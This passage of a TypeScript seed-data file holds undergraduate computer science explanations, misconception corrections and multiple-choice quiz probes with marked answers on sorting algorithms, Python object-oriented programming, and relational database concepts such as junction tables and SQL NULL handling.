  { conceptId: ELEMSORT, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Elementary sorts: Bubble sort — repeatedly swap adjacent out-of-order pairs; O(n²). Selection sort — find minimum, place at front, repeat; O(n²), O(n) swaps. Insertion sort — insert each element into its correct position in the already-sorted prefix; O(n²) worst case, O(n) on nearly-sorted data, stable, in-place. Insertion sort is the practical choice for small arrays (n < 20) or nearly sorted input — this is why Python\'s Timsort uses insertion sort on small runs.',
    targetedMisconceptions: [`${ELEMSORT}:M1`], source: ELEMSORT_SRC },
  { conceptId: ELEMSORT, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Bubble sort is the simplest, so it\'s a good default." Bubble sort has O(n²) comparisons AND O(n²) swaps in the worst case. Insertion sort is equally simple to implement, also O(n²) worst case, but O(n) on nearly-sorted data and has better constant factors due to fewer swaps. Bubble sort has virtually no practical use case where another algorithm isn\'t strictly better.',
    targetedMisconceptions: [`${ELEMSORT}:M1`], source: ELEMSORT_SRC },
]
const ELEMSORT_PROBES: SeedProbe[] = [
  { conceptId: ELEMSORT, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'An array is almost sorted — only 3 elements are out of place. Which elementary sort performs best?',
    choices: [
      { text: 'Insertion sort — O(n) on nearly-sorted input', isCorrect: true },
      { text: 'Bubble sort — it stops early once no swaps occur', isCorrect: false },
      { text: 'Selection sort — always O(n) swaps', isCorrect: false },
    ], correctValue: 'Insertion sort', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${ELEMSORT}:M1`], source: ELEMSORT_SRC },
  { conceptId: ELEMSORT, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Why is insertion sort preferred over bubble sort for small arrays in practice?',
    choices: [
      { text: 'Fewer swaps and O(n) performance on nearly-sorted data with better constants', isCorrect: true },
      { text: 'Bubble sort is O(n log n) on small arrays', isCorrect: false, misconceptionId: `${ELEMSORT}:M1` },
    ], correctValue: 'Fewer swaps, adaptive performance', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${ELEMSORT}:M1`], source: ELEMSORT_SRC },
]

const EFFSORT = 'cs.struct.efficient-sorts'
const EFFSORT_SRC = 'docs/computer-science/kg/graph.json — cs.struct.efficient-sorts'
const EFFSORT_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: EFFSORT, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Efficient comparison sorts achieve O(n log n) — the proven lower bound for comparison-based sorting. Merge sort: divide in half, sort recursively, merge — O(n log n) always, stable, O(n) extra space. Quick sort: partition around a pivot, sort sub-arrays — O(n log n) average, O(n²) worst case (already-sorted input with naive pivot), O(log n) space. Heap sort: build heap O(n), extract min repeatedly O(n log n) — in-place, not stable. Python\'s sorted()/list.sort() uses Timsort: merge sort adapted to exploit natural runs, O(n log n) worst, O(n) nearly-sorted.',
    targetedMisconceptions: [`${EFFSORT}:M1`], source: EFFSORT_SRC },
  { conceptId: EFFSORT, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Quick sort is always faster than merge sort." On average, quick sort outperforms merge sort due to better cache performance and no auxiliary allocation. But quick sort\'s worst case is O(n²) on adversarial input (e.g., sorted array with first-element pivot) while merge sort is O(n log n) always. Merge sort is preferred when worst-case guarantees matter (external sorting, guaranteed latency). Quick sort dominates in-memory sorting with random data due to constants.',
    targetedMisconceptions: [`${EFFSORT}:M1`], source: EFFSORT_SRC },
]
const EFFSORT_PROBES: SeedProbe[] = [
  { conceptId: EFFSORT, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What is the worst-case time complexity of Quicksort with a naive (first-element) pivot on an already-sorted array?',
    choices: [
      { text: 'O(n²)', isCorrect: true },
      { text: 'O(n log n) — Quicksort is always O(n log n)', isCorrect: false, misconceptionId: `${EFFSORT}:M1` },
      { text: 'O(n) — sorted input is the best case', isCorrect: false },
    ], correctValue: 'O(n²)', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${EFFSORT}:M1`], source: EFFSORT_SRC },
  { conceptId: EFFSORT, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Which sort algorithm should you prefer when you need guaranteed O(n log n) worst-case AND stability?',
    choices: [
      { text: 'Merge sort', isCorrect: true },
      { text: 'Quick sort — it is the fastest in all cases', isCorrect: false, misconceptionId: `${EFFSORT}:M1` },
    ], correctValue: 'Merge sort', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${EFFSORT}:M1`], source: EFFSORT_SRC },
]

// ─── cs.oop ───────────────────────────────────────────────────────────────────
const OOPCONCEPT = 'cs.oop.oop-concepts'
const OOPCONCEPT_SRC = 'docs/computer-science/kg/graph.json — cs.oop.oop-concepts'
const OOPCONCEPT_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: OOPCONCEPT, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Object-Oriented Programming organises code around objects — bundles of data (attributes) and behaviour (methods). Four pillars: encapsulation (hiding internal state; exposing only a controlled interface), inheritance (a class inherits attributes/methods from a parent, enabling code reuse), polymorphism (different classes respond to the same method call differently), abstraction (exposing only what the caller needs, hiding implementation detail). OOP models the world as interacting objects, making large codebases easier to reason about by localising change.',
    targetedMisconceptions: [`${OOPCONCEPT}:M1`], source: OOPCONCEPT_SRC },
  { conceptId: OOPCONCEPT, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "OOP always makes code better." OOP is a tool, not a virtue. It adds indirection and complexity; for small scripts or data-processing pipelines, procedural or functional styles are often clearer. Inheritance hierarchies are frequently over-engineered — "composition over inheritance" is a standing principle in modern software design. OOP excels when you have many objects of similar structure interacting; it hurts when forced onto problems that are naturally sequential or stateless.',
    targetedMisconceptions: [`${OOPCONCEPT}:M1`], source: OOPCONCEPT_SRC },
]
const OOPCONCEPT_PROBES: SeedProbe[] = [
  { conceptId: OOPCONCEPT, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Which OOP pillar describes hiding internal state and exposing only a controlled interface?',
    choices: [
      { text: 'Encapsulation', isCorrect: true },
      { text: 'Polymorphism', isCorrect: false },
      { text: 'Inheritance', isCorrect: false },
      { text: 'Abstraction', isCorrect: false, misconceptionId: `${OOPCONCEPT}:M1` },
    ], correctValue: 'Encapsulation', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${OOPCONCEPT}:M1`], source: OOPCONCEPT_SRC },
  { conceptId: OOPCONCEPT, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A student says "I should use OOP for every Python program because it\'s the professional way." What is wrong with this claim?',
    choices: [
      { text: 'OOP adds complexity; small scripts and pipelines are often clearer with procedural or functional styles', isCorrect: true },
      { text: 'Nothing — OOP is always the best approach for Python', isCorrect: false, misconceptionId: `${OOPCONCEPT}:M1` },
    ], correctValue: 'OOP is a tool, not always optimal', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${OOPCONCEPT}:M1`], source: OOPCONCEPT_SRC },
]

const CLSOBJS = 'cs.oop.classes-objects-python'
const CLSOBJS_SRC = 'docs/computer-science/kg/graph.json — cs.oop.classes-objects-python'
const CLSOBJS_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: CLSOBJS, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A class is a blueprint; an object is an instance built from it. In Python: class Dog: defines the blueprint; rex = Dog() creates an instance. __init__(self, ...) is the constructor — called automatically on creation, initialises instance attributes. self refers to the current instance; every method must accept it as the first parameter. Instance attributes (self.name) live on the object; class attributes live on the class and are shared by all instances.',
    targetedMisconceptions: [`${CLSOBJS}:M1`], source: CLSOBJS_SRC },
  { conceptId: CLSOBJS, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Class attributes and instance attributes are the same thing." Class attributes are shared across all instances; modifying one via the class changes it for everyone. Instance attributes are per-object. Dangerous pattern: class Foo: data = [] — all instances share the SAME list; appending to it via one instance appears to affect all others. Always put mutable defaults in __init__ as self.data = [].',
    targetedMisconceptions: [`${CLSOBJS}:M1`], source: CLSOBJS_SRC },
]
const CLSOBJS_PROBES: SeedProbe[] = [
  { conceptId: CLSOBJS, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'class Counter: count = 0. Two instances a and b both call a.count += 1 and b.count += 1. What is Counter.count?',
    choices: [
      { text: '0 — each +=1 creates a per-instance shadow attribute; Counter.count is unchanged', isCorrect: true },
      { text: '2 — both increments update the shared class attribute', isCorrect: false, misconceptionId: `${CLSOBJS}:M1` },
    ], correctValue: '0 (shadowed by instance attribute)', difficulty: ProbeDifficulty.ADVANCED, targetedMisconceptions: [`${CLSOBJS}:M1`], source: CLSOBJS_SRC },
  { conceptId: CLSOBJS, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Why is class Foo: items = [] dangerous when Foo is instantiated multiple times?',
    choices: [
      { text: 'All instances share the same list; appending via one instance affects all others', isCorrect: true },
      { text: 'Each instance gets its own copy automatically via copy-on-write', isCorrect: false, misconceptionId: `${CLSOBJS}:M1` },
    ], correctValue: 'Shared mutable class attribute', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${CLSOBJS}:M1`], source: CLSOBJS_SRC },
]

const ENCABSTR = 'cs.oop.encapsulation-abstraction'
const ENCABSTR_SRC = 'docs/computer-science/kg/graph.json — cs.oop.encapsulation-abstraction'
const ENCABSTR_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: ENCABSTR, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Encapsulation bundles data and methods together and controls access. In Python, by convention _name means "private" (don\'t touch from outside) and __name triggers name mangling (harder to access accidentally). Abstraction means hiding implementation detail — the caller uses a clean interface without knowing how it works internally. Together they enforce a contract: class internals can change freely as long as the public interface stays stable, preventing callers from breaking when internals evolve.',
    targetedMisconceptions: [`${ENCABSTR}:M1`], source: ENCABSTR_SRC },
  { conceptId: ENCABSTR, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Python\'s _ prefix makes an attribute truly private — outsiders can\'t access it." Python\'s single underscore is a convention, not enforcement — obj._name is fully accessible from outside. Double underscore __name triggers name mangling to _ClassName__name, making accidental access harder but not impossible. Python trusts programmers with "we\'re all consenting adults" — the _ convention signals intent, not a hard access barrier like Java\'s private.',
    targetedMisconceptions: [`${ENCABSTR}:M1`], source: ENCABSTR_SRC },
]
const ENCABSTR_PROBES: SeedProbe[] = [
  { conceptId: ENCABSTR, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'In Python, what does the single underscore prefix (e.g., self._balance) communicate?',
    choices: [
      { text: '"This is internal — don\'t use it from outside" (convention, not enforcement)', isCorrect: true },
      { text: 'The attribute is truly private and cannot be accessed outside the class', isCorrect: false, misconceptionId: `${ENCABSTR}:M1` },
    ], correctValue: 'Convention only — still accessible', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${ENCABSTR}:M1`], source: ENCABSTR_SRC },
  { conceptId: ENCABSTR, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Can external code access obj._name in Python?',
    choices: [
      { text: 'Yes — _ is a naming convention, not an access barrier', isCorrect: true },
      { text: 'No — _ makes the attribute completely inaccessible from outside', isCorrect: false, misconceptionId: `${ENCABSTR}:M1` },
    ], correctValue: 'Yes — accessible by convention only', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${ENCABSTR}:M1`], source: ENCABSTR_SRC },
]

const INHERIT = 'cs.oop.inheritance'
const INHERIT_SRC = 'docs/computer-science/kg/graph.json — cs.oop.inheritance'
const INHERIT_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: INHERIT, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Inheritance lets a child class acquire attributes and methods from a parent. In Python: class Cat(Animal): inherits everything from Animal. Override a method by redefining it in the child; call the parent\'s version with super().method(). Python supports multiple inheritance; the Method Resolution Order (MRO) via C3 linearisation determines which method is used when multiple parents define it. is-a relationship: a Cat IS AN Animal — valid inheritance. has-a (a Car HAS AN Engine) should use composition, not inheritance.',
    targetedMisconceptions: [`${INHERIT}:M1`], source: INHERIT_SRC },
  { conceptId: INHERIT, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "More inheritance = better design." Deep inheritance hierarchies become fragile — a change to a grandparent breaks all descendants unexpectedly. The "composition over inheritance" principle prefers giving objects references to helpers instead of subclassing. Inheritance is correct for genuine is-a relationships; for code reuse without an is-a relationship, composition or mixins are cleaner.',
    targetedMisconceptions: [`${INHERIT}:M1`], source: INHERIT_SRC },
]
const INHERIT_PROBES: SeedProbe[] = [
  { conceptId: INHERIT, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A Stack class needs to add push/pop to a list. Should Stack inherit from list?',
    choices: [
      { text: 'No — Stack has-a list (composition); it is not a list (inheritance)', isCorrect: true },
      { text: 'Yes — inheriting list gives Stack all list methods for free', isCorrect: false, misconceptionId: `${INHERIT}:M1` },
    ], correctValue: 'Composition, not inheritance', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${INHERIT}:M1`], source: INHERIT_SRC },
  { conceptId: INHERIT, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'When calling super().__init__() in a child class constructor, what does it do?',
    choices: [
      { text: 'Runs the parent class\'s __init__ to initialise inherited attributes', isCorrect: true },
      { text: 'Creates a new instance of the parent class separately', isCorrect: false },
    ], correctValue: 'Runs parent __init__', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${INHERIT}:M1`], source: INHERIT_SRC },
]

const POLYMORPH = 'cs.oop.polymorphism-overloading'
const POLYMORPH_SRC = 'docs/computer-science/kg/graph.json — cs.oop.polymorphism-overloading'
const POLYMORPH_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: POLYMORPH, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Polymorphism means "many forms" — the same method name behaves differently depending on the object. In Python, this is duck typing: if an object has a speak() method, you can call it regardless of its class — no shared base class required. Operator overloading via dunder methods: __add__ makes + work on custom objects; __len__ makes len() work; __str__ defines str() output. Method overriding in inheritance: child.speak() replaces parent.speak() while keeping the same interface.',
    targetedMisconceptions: [`${POLYMORPH}:M1`], source: POLYMORPH_SRC },
  { conceptId: POLYMORPH, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Python doesn\'t have method overloading like Java." Python has no static method overloading (same name, different parameter types). Instead, Python uses default parameters, *args, and **kwargs to handle multiple call signatures in one method body. __add__ is called for +; Python checks the right operand\'s __radd__ if the left operand returns NotImplemented. The dunder protocol is Python\'s operator overloading mechanism.',
    targetedMisconceptions: [`${POLYMORPH}:M1`], source: POLYMORPH_SRC },
]
const POLYMORPH_PROBES: SeedProbe[] = [
  { conceptId: POLYMORPH, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Which dunder method do you implement to make len(obj) work on a custom class?',
    choices: [
      { text: '__len__', isCorrect: true },
      { text: '__size__', isCorrect: false },
      { text: '__count__', isCorrect: false },
      { text: '__length__', isCorrect: false },
    ], correctValue: '__len__', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${POLYMORPH}:M1`], source: POLYMORPH_SRC },
  { conceptId: POLYMORPH, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Python has no function overloading. How do you write a function that accepts either 1 or 2 arguments?',
    choices: [
      { text: 'Use a default parameter: def f(a, b=None)', isCorrect: true },
      { text: 'Define two functions with the same name — Python picks by argument count', isCorrect: false, misconceptionId: `${POLYMORPH}:M1` },
    ], correctValue: 'Default parameters or *args', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${POLYMORPH}:M1`], source: POLYMORPH_SRC },
]

const CLSSTAT = 'cs.oop.class-static-methods'
const CLSSTAT_SRC = 'docs/computer-science/kg/graph.json — cs.oop.class-static-methods'
const CLSSTAT_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: CLSSTAT, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Instance methods (def f(self)) receive the instance as first arg. Class methods (@classmethod, def f(cls)) receive the class — used for alternative constructors (Date.from_string("2024-01-01")). Static methods (@staticmethod, def f()) receive neither — just a function logically grouped in the class namespace. Properties (@property) expose attribute-style access with getter/setter logic: obj.radius rather than obj.get_radius(). Choose by what the method needs: instance state → instance method; class state → classmethod; no state → staticmethod.',
    targetedMisconceptions: [`${CLSSTAT}:M1`], source: CLSSTAT_SRC },
  { conceptId: CLSSTAT, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Static methods are like Java static — they should hold shared state." Python @staticmethod is a function that lives in the class namespace for organisational reasons — it has NO access to class or instance state. @classmethod accesses the class (and therefore class attributes). Mutable shared state should almost always be avoided; if you need class-level state, use a class attribute and @classmethod to read/write it.',
    targetedMisconceptions: [`${CLSSTAT}:M1`], source: CLSSTAT_SRC },
]
const CLSSTAT_PROBES: SeedProbe[] = [
  { conceptId: CLSSTAT, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'You want an alternative constructor Date.from_iso("2024-07-01"). Which decorator should you use?',
    choices: [
      { text: '@classmethod', isCorrect: true },
      { text: '@staticmethod', isCorrect: false, misconceptionId: `${CLSSTAT}:M1` },
      { text: '@property', isCorrect: false },
    ], correctValue: '@classmethod', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${CLSSTAT}:M1`], source: CLSSTAT_SRC },
  { conceptId: CLSSTAT, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A @staticmethod in Python can access self or cls — true or false?',
    choices: [
      { text: 'False — it receives neither; it is a plain function in the class namespace', isCorrect: true },
      { text: 'True — it receives cls like a classmethod', isCorrect: false, misconceptionId: `${CLSSTAT}:M1` },
    ], correctValue: 'False', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${CLSSTAT}:M1`], source: CLSSTAT_SRC },
]

const DESPAT = 'cs.oop.design-patterns-intro'
const DESPAT_SRC = 'docs/computer-science/kg/graph.json — cs.oop.design-patterns-intro'
const DESPAT_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: DESPAT, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Design patterns are named, reusable solutions to recurring design problems. Three categories: Creational (how objects are created) — Singleton (one instance only), Factory (create objects without specifying exact class); Structural (how objects are composed) — Adapter (wrap incompatible interface), Decorator (add behaviour without subclassing); Behavioural (how objects communicate) — Observer (publish/subscribe), Strategy (swap algorithms at runtime), Iterator (sequential access). Patterns are vocabulary, not templates — applying one forces you to name the intent, making code readable.',
    targetedMisconceptions: [`${DESPAT}:M1`], source: DESPAT_SRC },
  { conceptId: DESPAT, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "More design patterns = better code." Patterns solve specific problems; forcing them where the problem doesn\'t exist creates accidental complexity. The Gang of Four patterns were partly a workaround for Java\'s lack of first-class functions — many collapse to a simple function in Python (Strategy = passing a function, Decorator = Python\'s @ decorator, Iterator = a generator). Reach for a pattern when you recognise the recurring problem it solves, not to signal sophistication.',
    targetedMisconceptions: [`${DESPAT}:M1`], source: DESPAT_SRC },
]
const DESPAT_PROBES: SeedProbe[] = [
  { conceptId: DESPAT, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'The Observer pattern is best described as:',
    choices: [
      { text: 'Objects register to be notified when another object\'s state changes (publish/subscribe)', isCorrect: true },
      { text: 'Ensuring only one instance of a class exists', isCorrect: false },
      { text: 'Wrapping an incompatible interface to match an expected one', isCorrect: false },
    ], correctValue: 'Publish/subscribe notification', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${DESPAT}:M1`], source: DESPAT_SRC },
  { conceptId: DESPAT, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'In Python, how is the Strategy pattern (swapping algorithms at runtime) most idiomatically implemented?',
    choices: [
      { text: 'Passing a function as an argument — no class needed', isCorrect: true },
      { text: 'Always building a Strategy class hierarchy with an abstract base', isCorrect: false, misconceptionId: `${DESPAT}:M1` },
    ], correctValue: 'Pass a function', difficulty: ProbeDifficulty.ADVANCED, targetedMisconceptions: [`${DESPAT}:M1`], source: DESPAT_SRC },
]

// ─── cs.db ────────────────────────────────────────────────────────────────────
const DBCONCEPT = 'cs.db.database-concepts'
const DBCONCEPT_SRC = 'docs/computer-science/kg/graph.json — cs.db.database-concepts'
const DBCONCEPT_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: DBCONCEPT, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A database is an organised collection of persistent data managed by a DBMS (Database Management System). Key advantages over plain files: concurrency control (multiple users safely), ACID transactions, query language (SQL), integrity constraints, backup/recovery. Relational databases store data in tables (relations) with rows (tuples) and columns (attributes). A schema defines table structure; instances hold the actual data. The DBMS mediates all access, enforcing rules files cannot.',
    targetedMisconceptions: [`${DBCONCEPT}:M1`], source: DBCONCEPT_SRC },
  { conceptId: DBCONCEPT, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "A spreadsheet is a database." A spreadsheet is a grid of cells with formulas — it has no concurrency control, no transaction guarantees, no query optimiser, and no referential integrity. Two users editing the same spreadsheet simultaneously can corrupt it. A DBMS handles thousands of concurrent users safely. Spreadsheets are fine for personal analysis; databases are required when data is shared, large, or must remain consistent under concurrent access.',
    targetedMisconceptions: [`${DBCONCEPT}:M1`], source: DBCONCEPT_SRC },
]
const DBCONCEPT_PROBES: SeedProbe[] = [
  { conceptId: DBCONCEPT, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Which feature does a DBMS provide that plain files do not?',
    choices: [
      { text: 'ACID transaction guarantees under concurrent access', isCorrect: true },
      { text: 'The ability to store text data', isCorrect: false },
      { text: 'Faster read speed than any other storage', isCorrect: false },
    ], correctValue: 'ACID transactions and concurrency control', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${DBCONCEPT}:M1`], source: DBCONCEPT_SRC },
  { conceptId: DBCONCEPT, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Why is a shared Excel spreadsheet not an adequate substitute for a database for a multi-user application?',
    choices: [
      { text: 'No concurrency control — simultaneous writes can corrupt data; no referential integrity or query engine', isCorrect: true },
      { text: 'Spreadsheets cannot store numbers — only text', isCorrect: false },
    ], correctValue: 'No concurrency, integrity, or query engine', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${DBCONCEPT}:M1`], source: DBCONCEPT_SRC },
]

const ERMODEL = 'cs.db.er-modeling'
const ERMODEL_SRC = 'docs/computer-science/kg/graph.json — cs.db.er-modeling'
const ERMODEL_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: ERMODEL, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Entity-Relationship (ER) diagrams model the data requirements before writing SQL. Entities (rectangles) are things we track — Student, Course. Attributes (ovals) are properties — name, grade. Relationships (diamonds) connect entities — Student ENROLS IN Course. Cardinality specifies how many: one-to-one (1:1), one-to-many (1:N), many-to-many (M:N). A primary key uniquely identifies each entity instance. ER diagrams translate directly to relational tables: entities become tables, M:N relationships become junction tables.',
    targetedMisconceptions: [`${ERMODEL}:M1`], source: ERMODEL_SRC },
  { conceptId: ERMODEL, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "I can model a M:N relationship directly as two foreign keys in one table." A Student-Course M:N relationship cannot be stored by adding a course_id column to the Student table — a student takes many courses. The correct solution is an Enrolment junction table: (student_id, course_id) as a composite primary key, with each row representing one student-course pair. Skipping the junction table forces denormalised, redundant, update-anomaly-prone designs.',
    targetedMisconceptions: [`${ERMODEL}:M1`], source: ERMODEL_SRC },
]
const ERMODEL_PROBES: SeedProbe[] = [
  { conceptId: ERMODEL, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A Student can enrol in many Courses; a Course can have many Students. This is a:',
    choices: [
      { text: 'Many-to-many (M:N) relationship requiring a junction table', isCorrect: true },
      { text: 'One-to-many (1:N) relationship — add student_id to Course', isCorrect: false, misconceptionId: `${ERMODEL}:M1` },
    ], correctValue: 'M:N — junction table', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${ERMODEL}:M1`], source: ERMODEL_SRC },
  { conceptId: ERMODEL, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'How do you implement a many-to-many relationship in a relational database?',
    choices: [
      { text: 'Create a junction (associative) table with foreign keys to both entities', isCorrect: true },
      { text: 'Add a multi-valued column to one of the tables', isCorrect: false, misconceptionId: `${ERMODEL}:M1` },
    ], correctValue: 'Junction table', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${ERMODEL}:M1`], source: ERMODEL_SRC },
]

const RELMODEL = 'cs.db.relational-model'
const RELMODEL_SRC = 'docs/computer-science/kg/graph.json — cs.db.relational-model'
const RELMODEL_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: RELMODEL, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'The relational model (Codd, 1970) represents all data as tables (relations) of rows (tuples) and columns (attributes). Key concepts: primary key (unique row identifier), foreign key (references primary key in another table — enforces referential integrity), domain (allowed values for a column). Relational algebra operations underlie SQL: select (σ, filter rows), project (π, choose columns), join (combine tables on matching columns), union, difference. Referential integrity: a foreign key value must exist in the referenced table or be NULL.',
    targetedMisconceptions: [`${RELMODEL}:M1`], source: RELMODEL_SRC },
  { conceptId: RELMODEL, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "NULL means zero or empty string." NULL means absence of a value — unknown or not applicable. NULL ≠ 0; NULL ≠ ""; NULL ≠ NULL (NULL = NULL evaluates to NULL, not TRUE). This causes bugs: WHERE col = NULL never matches — use WHERE col IS NULL. Arithmetic with NULL propagates: 5 + NULL = NULL. Counting: COUNT(*) counts rows; COUNT(col) skips NULLs. This three-valued logic (true/false/unknown) is one of SQL\'s most frequently misunderstood features.',
    targetedMisconceptions: [`${RELMODEL}:M1`], source: RELMODEL_SRC },
]
const RELMODEL_PROBES: SeedProbe[] = [
  { conceptId: RELMODEL, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What does NULL = NULL evaluate to in SQL?',
    choices: [
      { text: 'NULL (unknown) — use IS NULL to test for null', isCorrect: true },
      { text: 'TRUE — two nulls are equal', isCorrect: false, misconceptionId: `${RELMODEL}:M1` },
      { text: 'FALSE — null is never equal to anything', isCorrect: false },
    ], correctValue: 'NULL (unknown)', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${RELMODEL}:M1`], source: RELMODEL_SRC },
  { conceptId: RELMODEL, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A query WHERE phone = NULL returns 0 rows even though some rows have no phone number. Why?',
    choices: [
      { text: 'NULL comparisons always yield NULL (unknown), never TRUE — use IS NULL instead', isCorrect: true },
      { text: 'The database is broken — NULL should equal NULL', isCorrect: false, misconceptionId: `${RELMODEL}:M1` },
    ], correctValue: 'Use IS NULL', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${RELMODEL}:M1`], source: RELMODEL_SRC },
]

const NORMAL = 'cs.db.normalisation'
const NORMAL_SRC = 'docs/computer-science/kg/graph.json — cs.db.normalisation'
const NORMAL_EXPLANATIONS: SeedExplanation[] = [
